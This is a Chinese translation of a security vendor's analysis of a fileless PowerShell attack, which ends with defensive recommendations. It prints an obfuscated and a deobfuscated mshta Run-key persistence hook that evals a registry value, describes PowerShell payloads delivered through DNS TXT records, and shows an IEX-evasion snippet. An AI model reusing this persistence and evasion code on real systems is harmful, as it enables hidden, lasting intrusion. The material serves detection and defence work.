> 原文链接: https://www.anquanke.com//post/id/86012 


# 【技术分享】PowerShell注入技巧：无盘持久性和绕过技术


                                阅读量   
                                **130474**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：binarydefense.com
                                <br>原文地址：[http://www.binarydefense.com/powershell-injection-diskless-persistence-bypass-techniques/](http://www.binarydefense.com/powershell-injection-diskless-persistence-bypass-techniques/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t017c9e267f1e62cf31.png)](https://p2.ssl.qhimg.com/t017c9e267f1e62cf31.png)

****

翻译：[**WisFree**](http://bobao.360.cn/member/contribute?uid=2606963099)

**预估稿费：190RMB**

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**写在前面的话**

PowerShell是网络安全专家、IT管理员以及黑客们最喜欢的工具之一，这一点是毋庸置疑的。PowerShell的可扩展性和其强大的功能让微软操作系统的可控制程度上升到了一个前所未有的等级。简单说来，Powershell 是运行在windows机器上实现系统和应用程序管理自动化的命令行脚本环境，而它可以算是颠覆了传统的命令行提示符-cmd.exe。

在Binary Defense（一家专业从事网络安全业务的公司）中有着大量PowerShell的拥护者，无论是进行自动化测试也好，还是进行复杂的程序分析也罢，PowerShell都是他们的首选工具。除此之外，像PowerShell Empire以及PowerSploit这样的工具也是网络安全研究领域以及黑客的挚爱。

<br>

**攻击分析**

我们通常可以看到很多利用PowerShell的攻击向量，而且在昨天晚上，我们的终端安全检测与应急响应平台（[Vision](http://www.binarydefense.com/endpoint-protection/)）检测到了一个使用了多种方法来实现攻击持久化并规避传统反病毒技术的攻击事件。它所使用的第一种方法是让目标用户访问一个需要升级Adobe Flash浏览器插件的网站，而攻击者在这里需要使用到mshta.exe（一种HTA攻击方法），MSHTA.exe是微软的一个合法程序，它可以在任何浏览器中随时调用。但是在大多数情况下，它并不是合法的扩展，因此我们建议用户在配置防火墙时屏蔽所有的HTA扩展。因为HTA文件允许我们调用任意的命令，而攻击者同样可以做到这一点，所以启用HTA扩展很有可能让我们的主机遭到攻击。

需要注意的是，这个攻击向量在很多年前就已经嵌入在了Unicorn和社会工程学工具套件（SET）之中了。

[![](https://p3.ssl.qhimg.com/t018fc2b2985281f3e2.png)](https://p3.ssl.qhimg.com/t018fc2b2985281f3e2.png)

此时，如果系统弹出了提示框，而攻击者又根据提示框中的信息进行了操作（打开-open），那么目标用户将会被攻击。攻击向量可以是一个VBS下载器、PowerShell，或者是一段下载后自动执行的恶意代码。只要用户点击了“Open”，任何事情都有可能会发生。但是在我们近期所研究的攻击案例中，攻击者使用了HTA攻击方法作为攻击的初始阶段和Dropper。

页面会发起一个恶意HTA，当用户打开了这个HTA之后，Vision会立刻检测到其恶意行为：

[![](https://p3.ssl.qhimg.com/t01f8c267d3947e3c63.png)](https://p3.ssl.qhimg.com/t01f8c267d3947e3c63.png)

当文件被打开之后，一段PowerShell命令将会被执行。一般情况下攻击者会通过PowerShell发动SYSWOW64降级攻击，这种攻击向量可以将进程降级为32位进程，并实现shellcode注入攻击，而且Unicorn／SET多年以来一直都在使用这种技术。

在对具体的日志记录进行了分析之后我们发现，很多攻击者会使用Invoke-Expression（IEX）来提取出特定的注册表键，并实现持久化钩子。在PowerShell的初始调用中，变量名和持久化钩子都经过了混淆处理。大致如下图所示：

[![](https://p5.ssl.qhimg.com/t014deb3ea79a6ad70c.png)](https://p5.ssl.qhimg.com/t014deb3ea79a6ad70c.png)

在这种攻击中，注册表入口位于CurrentVersionRun，而这里也是持久化钩子的起始位置。

日志信息如下：

混淆后的持久化注册表钩子：

```
HKEY_USERS:SANITIZEDSoftwareMicrosoftWindowsCurrentVersionRun
"C:Windowssystem32mshta.exe" "about:&lt;script&gt;c1hop="X642N10";R3I=new%20ActiveXObject("WScript.Shell");QR3iroUf="I7pL7";k9To7P=R3I.RegRead("HKCU\software\bkzlq\zsdnhepyzs");J7UuF1n="Q2LnLxas";eval(k9To7P);JUe5wz3O="zSfmLod";&lt;/script&gt;"
```

反混淆后的持久化注册表钩子：

```
&lt;script&gt;
WScript_Shell_Object = new ActiveXObject("WScript.Shell");
Registry_Key_Value=WScript_Shell_Object.RegRead("HKCU\software\bkzlq\zsdnhepyzs");
eval(Registry_Key_Value);
&lt;/script&gt;
```

这种就是我们所称之为的无文件攻击向量，因为它不需要向硬盘写入任何内容，它唯一需要的就是注册表键，并通过运行注册表键来在目标系统中实现持久化注入。在我们的攻击场景中，mshta.exe将利用嵌入了PowerShell指令的WScript.shell来调用特定的注册表键，而且传统的反病毒产品以及目前绝大多数安全解决方案都无法检测到这种无文件的持久化攻击。

利用原生的PowerShell以及mshta，攻击者将可以通过传统的感染技术来实现系统入侵，而且完全不需要下载额外的恶意代码或安插系统后门。在此过程中，大多数攻击者会选择使用Invoke-Expression，但是具体的攻击实现方法也是多种多样的。近期，安全研究专家Vincent Yiu（[@vysecurity](https://www.twitter.com/@vysecurity)）演示了一种无需调用IEX和ExcodedCommand就可以绕过传统检测技术的攻击方法，而且目前很多高级攻击者也在广泛使用这种技术。有关这项技术的更多详细内容请参考Vincent Yiu的Twitter：

[![](https://p5.ssl.qhimg.com/t01c95035bb84dece0b.png)](https://p5.ssl.qhimg.com/t01c95035bb84dece0b.png)

在这个例子中，网站的TXT记录将会下载PowerShell命令，并通过nslookup在系统中执行这些命令。这也就意味着，我们可以将命令注入在DNS的TXT记录中，然后让系统自动执行这些PowerShell命令。Vision所检测到的一种恶意行为模式如下：

[![](https://p5.ssl.qhimg.com/t0117fdf2aaa2cf8e89.png)](https://p5.ssl.qhimg.com/t0117fdf2aaa2cf8e89.png)

如果检测到了nslookup或者代码提取行为，那么Vision将能够迅速识别出PowerShell代码中的nslookup请求以及TXT记录中的恶意代码。需要注意的是，Vencent Yiu所提供的方法只能执行一个文件而无法执行代码本身，因此我们还需要其他的命令从nslookup TXT记录中提取出代码并执行它们。

安全研究专家[Daniel Bohannon](https://www.twitter.com/@DanielBohannon)给出了一种不同的实现方法，但这种方法仍然需要用到IEX。演示样例如下：

```
$nslookupResult1 = 'iex'
$nslookupResult2 = 'Write-Host THIS IS MY ACTUAL PAYLOAD -f green'
. $nslookupResult1 $nslookupResult2
 
or even better:
 
$nslookupAllInOne = @('iex','Write-Host ALL IN ONE -f green')
. $nslookupAllInOne[0] $nslookupAllInOne[1]
```

下图为Vision所识别出的一种特定攻击模式：

[![](https://p4.ssl.qhimg.com/t01a606bdf3b6886a9d.png)](https://p4.ssl.qhimg.com/t01a606bdf3b6886a9d.png)

<br>

**应对方案**

对于那些没有使用Vision代码防御平台的企业来说，可以采用以下几种实践方法来防止攻击者利用PowerShell攻击企业的网络系统：

限制PowerShell命令的字符长度；

限制PowerShell的语言模式；

启用增强型PowerShell；（[**参考资料**](https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/)）；

定期执行威胁检测以尽早识别出可疑活动；

审查DNS日志并寻找可疑的控制命令和DNS请求；

搜索可疑的System.Management.Automation.dll以及System.Management.Automation.ni.dll

利用类似Sysmon这样的工具来检测和记录可疑进程；

在正常情况下禁止普通用户执行PowerShell命令（AppLocker +Device Guard可以防止普通用户使用PowerShell）；

监控powershell.exe的子进程以及可能存在的钩子；

搜索powershell.exe派生出的32位PowerShell子进程，这也是一种shellcode注入技术的典型检测方法；

更多内容请参考Matthew Graeber的[**Twitter**](https://twitter.com/mattifestation)；

[![](https://p3.ssl.qhimg.com/t0141a617304af57e67.png)](https://p3.ssl.qhimg.com/t0141a617304af57e67.png)

<br>

**总结**

由于安全研究人员和网络攻击者会遇到越来越先进的PowerShell以及相应的检测绕过技术，那些基于模式识别的传统检测方法已经不能再仅仅依靠恶意PowerShell来完成检测了，而且随着代码混淆技术的不断发展，安全防御人员的工作更是难上加难。因此，我们只有尽早地识别出可疑的行为模式，才能够降低个人用户和企业用户受到攻击的可能性。
